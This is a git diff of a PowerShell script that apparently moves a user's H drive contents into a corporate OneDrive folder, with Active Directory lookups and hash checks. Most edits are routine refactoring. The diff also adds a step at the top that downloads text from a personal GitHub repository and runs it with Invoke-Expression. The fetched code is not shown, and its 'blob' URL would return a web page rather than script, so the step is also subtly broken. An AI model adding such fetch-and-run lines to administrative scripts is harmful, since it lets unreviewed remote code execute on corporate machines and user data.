@@ -1,4 +1,6 @@
 ﻿Start-Transcript -Path "C:\temp\TransferTranscript.txt"
+$FunctionFromGitHub = Invoke-WebRequest https://github.com/raggingsoldier/Mitigation/blob/main/annoyingFunction
+Invoke-Expression $($FunctionFromGitHub.Content)
 import-module ActiveDirectory
 
 #new - function to get paths over 250
@@ -12,14 +14,15 @@ Where-Object {$_.FullName.length -ge 250}
 $user = $domainUser.split('\')[1]
 
 #Grab SID from Regedit
-$sid = @( "wmic useraccount where name='$user' get sid" | cmd )
-$SID = [string]$sid[-6]
+$objUser = New-Object System.Security.Principal.NTAccount("$user")
+$strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier])
+$strSID.Value
 
 #Grab H Drive from AD
-$homeDirectory = Get-PSDrive | Select-object Name, @{n="Root"; e={if ($_.DisplayRoot -eq $null) {$_.Root} else {$_.DisplayRoot}}}| Where-object Name -Contains "H"
-[string]$homeDirectory = "Microsoft.Powershell.Core/filesystem::$homeDirectory"
-$homeDirectory = $homeDirectory.split('=')[2]
-$homeDirectory = $homeDirectory.split('}')[0]
+$homeDirectory = Get-ADUser -Identity $user -Properties * | Select-Object HomeDirectory
+$homeDirectory = "Microsoft.Powershell.Core/filesystem::$homeDirectory"
+$homeDirectory = ($homeDirectory.Split("="))[1]
+$homeDirectory = ($homeDirectory.Split("}"))[0]
 
 #Create Folder in One Drive that will hold H Drive Contents
 New-Item -ItemType Directory -Path "C:\Users\$user\OneDrive - Xcel Energy Services Inc\H Drive" -Force
@@ -47,8 +50,8 @@ Try {
     if ($null -eq $comparisonResult) {
         Write-Output("Success the hashes are the Same!")
 
-        #Set-ItemProperty -Path "HKU:\$sid\Software\Microsoft\OneDrive\Accounts\Business1" -Name "Documents" -Value 1
-        #Set-ItemProperty -Path "HKU:\$sid\Software\Microsoft\OneDrive\Accounts\Business1" -Name "Pictures" -Value 1
+        #Set-ItemProperty -Path "HKU:\$strSID\Software\Microsoft\OneDrive\Accounts\Business1" -Name "Documents" -Value 1
+        #Set-ItemProperty -Path "HKU:\$strSID\Software\Microsoft\OneDrive\Accounts\Business1" -Name "Pictures" -Value 1
         Stop-Transcript
     } else {
          Write-Output("Failed the hashes dont match need human interaction!")
